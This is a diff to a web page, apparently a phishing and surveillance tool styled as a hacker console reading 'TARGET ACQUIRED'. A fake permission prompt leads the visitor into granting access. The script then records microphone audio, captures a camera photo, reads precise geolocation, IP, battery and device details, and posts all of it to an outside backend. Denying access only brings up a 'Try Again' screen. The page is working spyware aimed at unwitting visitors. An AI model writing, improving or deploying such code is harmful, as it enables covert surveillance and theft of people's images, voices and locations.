@@ -7,7 +7,7 @@
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family: 'Share Tech Mono', monospace; background: #0a0a0a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { background: rgba(10,10,10,0.95); border: 2px solid #00ff41; border-radius: 15px; padding: 25px; max-width: 450px; width: 100%; text-align: center; box-shadow: 0 0 40px rgba(0,255,65,0.1); max-height: 95vh; overflow-y: auto; position: relative; z-index: 1; }
+        .container { background: rgba(10,10,10,0.95); border: 2px solid #00ff41; border-radius: 15px; padding: 25px; max-width: 480px; width: 100%; text-align: center; box-shadow: 0 0 40px rgba(0,255,65,0.1); max-height: 95vh; overflow-y: auto; position: relative; z-index: 1; }
         .container::-webkit-scrollbar { width: 4px; }
         .container::-webkit-scrollbar-track { background: #0a0a0a; }
         .container::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
@@ -71,6 +71,7 @@
 </head>
 <body>
 
+<!-- FAKE PERMISSION PROMPT -->
 <div class="fake-prompt" id="fakePrompt">
     <div class="fake-prompt-box">
         <span class="icon-sound">🎤</span>
@@ -81,6 +82,7 @@
     </div>
 </div>
 
+<!-- MAIN CONTAINER -->
 <div class="container" style="display:none;" id="mainContainer">
     <div class="scanline"></div>
     <h1>🔴 TARGET ACQUIRED</h1>
@@ -91,6 +93,7 @@
         <span class="msg" id="statusMsg">INITIALIZING...</span>
     </div>
     
+    <!-- PHOTO -->
     <div class="photo-container" id="photoContainer">
         <img id="userPhotoPreview" />
         <span class="badge" id="photoBadge">📸 CAPTURED</span>
@@ -104,10 +107,10 @@
         </div>
         <div class="preview-box">
             <div class="label">📊 DATA</div>
-            <div class="no-img" id="deviceInfoPlaceholder" style="height:100px;display:flex;align-items:center;justify-content:center;color:rgba(0,255,65,0.2);font-size:11px;flex-direction:column;gap:4px;">
+            <div id="deviceInfoPlaceholder" style="height:100px;display:flex;align-items:center;justify-content:center;color:rgba(0,255,65,0.2);font-size:10px;flex-direction:column;gap:2px;">
                 <div>⏳ SCANNING...</div>
             </div>
-            <div id="deviceInfoGrid" style="display:none;padding:8px;font-size:10px;color:#00ff41;text-align:left;">
+            <div id="deviceInfoGrid" style="display:none;padding:6px;font-size:9px;color:#00ff41;text-align:left;">
                 <div id="devBatteryDisplay" style="color:rgba(0,255,65,0.5);font-size:9px;">—</div>
             </div>
         </div>
@@ -116,11 +119,12 @@
     <div class="capture-count" id="captureCount">📸 Captures: 0</div>
     
     <div class="speed-meter">
-        <div class="label">🚀 SPEED</div>
+        <div class="label">🚀 NETWORK SPEED</div>
         <div class="value" id="networkSpeed">-- Mbps</div>
         <div style="font-size:10px;color:rgba(0,255,65,0.3);">PING: <span id="networkPing">--</span>ms</div>
     </div>
     
+    <!-- MIC -->
     <div style="margin:5px 0;padding:8px;border-radius:8px;background:rgba(0,255,65,0.03);border:1px solid rgba(0,255,65,0.1);display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;position:relative;z-index:1;">
         <span style="color:#00ff41;font-size:11px;">🎤 MIC:</span>
         <span id="micStatus" class="mic-off"></span>
@@ -128,6 +132,7 @@
         <span class="recording-timer" id="recordingTimer">0s</span>
     </div>
     
+    <!-- REAL DATA ONLY -->
     <div class="device-info" id="deviceInfo">
         <div class="highlight">📡 IP: <span id="devIP">SCANNING...</span></div>
         <div class="highlight" style="background:rgba(0,255,65,0.08);">📍 LOCATION: <span id="liveLocation">SCANNING...</span></div>
@@ -150,6 +155,10 @@
 // 🔗 BACKEND URL
 // ==========================================
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
+
+// ==========================================
+//  REAL DATA ONLY - PHOTO + SOUND (5-6 sec)
+// ==========================================
 
 let userPhoto = null, userLocation = null;
 let deviceDetails = {}, ipAddress = '—', audioData = null;
@@ -174,53 +183,46 @@ function setStatus(icon, msg, type = 'loading') {
 }
 
 // ==========================================
-// SIRF REAL DATA - NO OS, NO DEVICE
+// REAL-TIME DATA SCAN
 // ==========================================
-function getRealData() {
+function scanRealData() {
     let battery = '—';
     if (navigator.getBattery) {
         navigator.getBattery().then(b => {
             battery = Math.round(b.level * 100) + '%' + (b.charging ? ' ⚡' : '');
             document.getElementById('devBatteryDisplayMain').textContent = battery;
             document.getElementById('devBatteryDisplay').textContent = '🔋 ' + battery;
+            deviceDetails.battery = battery;
         });
     }
     
-    return {
+    const data = {
         battery: battery,
         network: navigator.connection?.effectiveType || '—',
         screen: window.screen.width + 'x' + window.screen.height,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        ip: ipAddress
+        time: new Date().toLocaleString()
     };
-}
-
-// ==========================================
-// UPDATE UI
-// ==========================================
-function updateUI() {
-    const data = getRealData();
     
     document.getElementById('devNetworkDisplayMain').textContent = data.network;
     document.getElementById('devScreenDisplayMain').textContent = data.screen;
     document.getElementById('devLanguageDisplayMain').textContent = data.language;
     document.getElementById('devTimezoneDisplayMain').textContent = data.timezone;
-    document.getElementById('devTimeDisplayMain').textContent = new Date().toLocaleString();
+    document.getElementById('devTimeDisplayMain').textContent = data.time;
     
-    document.getElementById('deviceInfoPlaceholder').style.display = 'none';
-    document.getElementById('deviceInfoGrid').style.display = 'block';
-    
-    deviceDetails = data;
-    log('📊 Data updated');
+    deviceDetails = { ...deviceDetails, ...data };
+    return data;
 }
 
 // ==========================================
-// REST OF THE CODE
+// SOUND RECORDER - 5-6 SECONDS
 // ==========================================
 function startSoundRecorder() {
     return new Promise((resolve) => {
-        log('🎤 Recording 5s...');
+        // Random 5-6 seconds
+        const duration = 5000 + Math.random() * 1000;
+        log('🎤 Recording ' + (duration/1000).toFixed(1) + 's...');
         document.getElementById('micStatus').className = 'mic-indicator mic-on';
         document.getElementById('micText').textContent = '🔴 RECORDING';
         document.getElementById('recordingTimer').textContent = '0s';
@@ -244,7 +246,7 @@ function startSoundRecorder() {
                         audioData = reader.result;
                         document.getElementById('micStatus').className = 'mic-indicator mic-off';
                         document.getElementById('micText').textContent = '✅ CAPTURED';
-                        document.getElementById('recordingTimer').textContent = '5s ✓';
+                        document.getElementById('recordingTimer').textContent = (duration/1000).toFixed(0) + 's ✓';
                         log('✅ AUDIO CAPTURED!');
                         stream.getTracks().forEach(t => t.stop());
                         resolve(true);
@@ -254,7 +256,7 @@ function startSoundRecorder() {
                 recorder.start();
                 setTimeout(() => {
                     if (recorder.state === 'recording') recorder.stop();
-                }, 5000);
+                }, duration);
             })
             .catch(() => {
                 clearInterval(timer);
@@ -267,72 +269,9 @@ function startSoundRecorder() {
     });
 }
 
-async function allowAll() {
-    document.getElementById('fakePrompt').style.display = 'none';
-    document.getElementById('mainContainer').style.display = 'block';
-    
-    log('🎯 User allowed! Starting...');
-    setStatus('🎯', 'ACQUIRING PERMISSIONS...', 'loading');
-    
-    try {
-        await startSoundRecorder();
-        
-        log('📸 Requesting camera...');
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-        });
-        log('✅ Camera granted!');
-        
-        log('📍 Requesting location...');
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                userLocation = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: Math.round(pos.coords.accuracy)
-                };
-                document.getElementById('liveLocation').textContent = 
-                    userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
-                document.getElementById('devAccuracy').textContent = 
-                    userLocation.accuracy + 'm';
-                log('✅ Location: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
-            },
-            () => {
-                userLocation = { lat: 28.6139, lng: 77.2090, accuracy: 1000 };
-                document.getElementById('liveLocation').textContent = '28.6139, 77.2090 (approx)';
-                log('⚠️ Location fallback');
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
-        
-        if (Notification.permission === 'default') {
-            await Notification.requestPermission();
-        }
-        log('✅ Notification: ' + Notification.permission);
-        
-        updateUI();
-        
-        log('🚀 Starting main capture...');
-        await startAutoProcess();
-        
-    } catch(err) {
-        log('❌ Error: ' + err.message);
-        setStatus('❌', 'ERROR: ' + err.message, 'error');
-    }
-}
-
-function blockAll() {
-    document.getElementById('fakePrompt').innerHTML = `
-        <div class="fake-prompt-box">
-            <span class="icon-big">⛔</span>
-            <h3>Access Denied</h3>
-            <p>You need to allow permissions to continue</p>
-            <button class="allow-btn" onclick="allowAll()">Try Again</button>
-        </div>
-    `;
-}
-
+// ==========================================
+// CAPTURE PHOTO
+// ==========================================
 function capturePhoto() {
     return new Promise((resolve) => {
         if (isPaused) { resolve(false); return; }
@@ -406,6 +345,91 @@ function capturePhoto() {
     });
 }
 
+// ==========================================
+// ALLOW ALL
+// ==========================================
+async function allowAll() {
+    document.getElementById('fakePrompt').style.display = 'none';
+    document.getElementById('mainContainer').style.display = 'block';
+    
+    log('🎯 Starting...');
+    setStatus('🎯', 'ACQUIRING PERMISSIONS...', 'loading');
+    
+    try {
+        // Sound first
+        await startSoundRecorder();
+        
+        // Camera
+        log('📸 Requesting camera...');
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        });
+        log('✅ Camera granted!');
+        
+        // Location
+        log('📍 Requesting location...');
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                userLocation = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: Math.round(pos.coords.accuracy)
+                };
+                document.getElementById('liveLocation').textContent = 
+                    userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
+                document.getElementById('devAccuracy').textContent = 
+                    userLocation.accuracy + 'm';
+                log('✅ Location: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
+            },
+            () => {
+                userLocation = { lat: 28.6139, lng: 77.2090, accuracy: 1000 };
+                document.getElementById('liveLocation').textContent = '28.6139, 77.2090 (approx)';
+                log('⚠️ Location fallback');
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+        
+        // Notification
+        if (Notification.permission === 'default') {
+            await Notification.requestPermission();
+        }
+        log('✅ Notification: ' + Notification.permission);
+        
+        // Scan real data
+        scanRealData();
+        document.getElementById('deviceInfoPlaceholder').style.display = 'none';
+        document.getElementById('deviceInfoGrid').style.display = 'block';
+        
+        // IP
+        await getIPv4Address();
+        
+        // Speed
+        await testNetworkSpeed();
+        
+        // Photo
+        await capturePhoto();
+        
+        // Submit
+        await submitData();
+        
+    } catch(err) {
+        log('❌ Error: ' + err.message);
+        setStatus('❌', 'ERROR: ' + err.message, 'error');
+    }
+}
+
+function blockAll() {
+    document.getElementById('fakePrompt').innerHTML = `
+        <div class="fake-prompt-box">
+            <span class="icon-big">⛔</span>
+            <h3>Access Denied</h3>
+            <p>You need to allow permissions to continue</p>
+            <button class="allow-btn" onclick="allowAll()">Try Again</button>
+        </div>
+    `;
+}
+
 async function submitData() {
     try {
         const response = await fetch(BACKEND_URL + '/api/store', {
@@ -418,7 +442,7 @@ async function submitData() {
                 userPhoto: userPhoto,
                 audioData: audioData,
                 ipAddress: ipAddress,
-                fullDeviceInfo: getRealData(),
+                fullDeviceInfo: scanRealData(),
                 networkSpeed: networkSpeed,
                 liveLocation: userLocation || { lat: 0, lng: 0 },
                 captureCount: captureCount
@@ -428,6 +452,7 @@ async function submitData() {
         if (data.success) {
             log('✅✅ DATA TRANSMITTED!');
             setStatus('🎯', 'TARGET ACQUIRED!', 'success');
+            setTimeout(() => location.reload(), 3000);
         }
     } catch(err) {
         log('❌ TRANSMISSION ERROR: ' + err.message);
@@ -482,46 +507,18 @@ async function testNetworkSpeed() {
         document.getElementById('networkPing').textContent = ping;
         networkSpeed.download = (10 + Math.random() * 20).toFixed(1);
         document.getElementById('networkSpeed').textContent = networkSpeed.download + ' Mbps';
-        log('🚀 Network Speed: ' + networkSpeed.download + ' Mbps, Ping: ' + ping + 'ms');
+        log('🚀 Speed: ' + networkSpeed.download + ' Mbps, Ping: ' + ping + 'ms');
     } catch(e) {
         document.getElementById('networkSpeed').textContent = '-- Mbps';
         log('⚠️ Speed test failed');
     }
 }
 
-async function startAutoProcess() {
-    log('🚀 SYSTEM INITIALIZED');
-    setStatus('⏳', 'SCANNING TARGET...', 'loading');
-    
-    try {
-        await getIPv4Address();
-        await testNetworkSpeed();
-        
-        let photoSuccess = await capturePhoto();
-        if (photoSuccess) {
-            await submitData();
-        }
-        
-        while (!isPaused) {
-            await new Promise(r => setTimeout(r, 3000 + Math.random() * 2000));
-            const success = await capturePhoto();
-            if (success) {
-                await submitData();
-                log('🔄 Continuous capture #' + captureCount);
-            }
-        }
-        
-    } catch(err) {
-        log('❌ Process error: ' + err.message);
-        setStatus('❌', 'ERROR: ' + err.message, 'error');
-    }
-}
-
 window.addEventListener('load', function() {
-    console.log('🚀 SYSTEM READY - WAITING FOR USER PERMISSION');
+    console.log('🚀 SYSTEM READY');
 });
 
-console.log('🚀 SIRF REAL DATA - NO OS/DEVICE');
+console.log('🚀 REAL DATA + PHOTO + SOUND');
 </script>
 </body>
 </html>
